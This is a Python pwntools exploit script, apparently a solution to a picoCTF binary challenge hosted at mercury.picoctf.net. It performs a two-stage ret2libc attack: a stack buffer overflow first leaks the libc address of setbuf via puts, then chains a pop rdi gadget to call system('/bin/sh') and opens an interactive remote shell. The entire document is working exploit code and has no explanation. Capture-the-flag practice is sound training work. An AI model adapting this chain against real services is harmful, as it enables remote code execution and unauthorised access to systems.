#!/usr/bin/env python3
from pwn import *

def exploit(process):
    """
    Performs the exploitation process using the provided process object.
    """
    elf = ELF('./vuln_patched', checksec=False)
    libc = ELF('./libc.so.6', checksec=False)
    rop = ROP(elf)

    junk = b"A" * 136
    # Addresses and offsets
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    setbuf_at_got = elf.got['setbuf']
    puts_at_plt = elf.plt['puts']
    back_to_main = elf.sym['main']
    setbuf_offset = libc.sym['setbuf']
    system_offset = libc.sym['system']
    bin_sh_offset = next(libc.search(b"/bin/sh"))
    ret_instruction = rop.find_gadget(['ret'])[0]

    # First payload to leak the libc address
    payload = b"".join([
        junk,
        p64(pop_rdi),
        p64(setbuf_at_got),
        p64(puts_at_plt),
        p64(back_to_main)
    ])
    process.sendline(payload)

    process.recvline() # consume banner
    process.recvline() # consume any intermediate output
    log.info(f"Buffer overflow succeeded!")

    # Leak libc address
    leak = u64(process.recvline().strip().ljust(8, b"\x00"))
    log.info(f"Leaked address: {hex(leak)}")

    # Calculate libc base address and required function/variable addresses
    base_address_of_libc = leak - setbuf_offset
    log.info(f"Base address of LIBC: {hex(base_address_of_libc)}")

    system_address = base_address_of_libc + system_offset
    bin_sh_address = base_address_of_libc + bin_sh_offset

    # Second payload to spawn a shell
    second_payload = b"".join([
        junk,
        p64(pop_rdi),
        p64(bin_sh_address),
        p64(ret_instruction),  # Stack alignment
        p64(system_address),
    ])
    process.sendline(second_payload)

    # Switch to interactive mode
    process.interactive()

if __name__ == "__main__":
    process_instance = remote("mercury.picoctf.net", 1774)
    exploit(process_instance)
